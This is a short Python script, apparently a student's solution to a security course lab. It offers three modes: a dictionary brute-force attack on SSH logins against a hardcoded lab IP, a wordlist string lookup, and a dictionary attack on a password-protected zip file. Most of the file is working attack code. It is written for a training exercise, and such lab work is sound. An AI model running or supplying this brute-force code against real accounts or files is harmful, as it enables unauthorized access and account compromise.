#!/usr/bin/env python3
#Script: Ops 401 Class 18 Ops Challenge Solution
# Author: Dericus Horner
# Date of latest revision:05/10/2023
# Assistance from Chat GPT

import paramiko
import time
import zipfile

def ssh_login(ip, username, password):
    """Attempts to authenticate to an SSH server using the given IP, username, and password.
    Returns True if successful, False otherwise.
    """
    try:
        # Create a new SSH client object
        ssh = paramiko.SSHClient()

        # Automatically add the server's host key (this is insecure and should be improved in production environments)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Attempt to connect to the SSH server using the given IP and username
        ssh.connect(ip, username=username, password=password)

        # If we successfully connect, return True to indicate successful login
        return True

    except paramiko.AuthenticationException:
        # If authentication fails, return False
        return False

    finally:
        # Always close the SSH connection
        ssh.close()

def brute_force_zip(zip_file_path, word_list_path):
    """Attempts to brute force attack a password-locked zip file using the given word list."""
    with zipfile.ZipFile(zip_file_path) as zip_file:
        with open(word_list_path, 'r', encoding='latin-1') as word_list_file:
            for line in word_list_file:
                password = line.strip()
                try:
                    zip_file.extractall(pwd=password.encode())
                    print(f"Password found: {password}")
                    return
                except zipfile.BadPassword:
                    print(f"Trying password: {password}")
                    continue
    print("Password not found in the word list.")

# Prompt the user to select a mode
mode = input("Select a mode (1 for Offensive, 2 for Defensive, 3 for Zip Brute Force): ")

if mode == "1":
    # Offensive mode: iterate through word list file and print each word with a delay
    word_list_path = input("Enter path to word list file: ")
    with open(word_list_path, 'r') as f:
        for line in f:
            password = line.strip()
            print(f"Trying password: {password}")
            if ssh_login("192.168.3.46", "myusername", password):
                print("Successful login!")
                break
            time.sleep(0.5)

elif mode == "2":
    # Defensive mode: prompt user for a string and a word list file, search for string in file
    user_string = input("Enter a string to search for: ")
    word_list_path = input("Enter path to word list file: ")
    with open(word_list_path, 'r') as f:
        word_list = [line.strip() for line in f]
    if user_string in word_list:
        print(f"{user_string} was found in the word list!")
    else:
        print(f"{user_string} was not found in the word list.")

elif mode == "3":
    # Zip brute force mode: brute force attack a password-locked zip file
    zip_file_path = input("Enter path to the password-locked zip file: ")
    word_list_path = input("Enter path to the word list file: ")
    brute_force_zip(zip_file_path, word_list_path)

else:
    print("Invalid mode selected.")

    # Done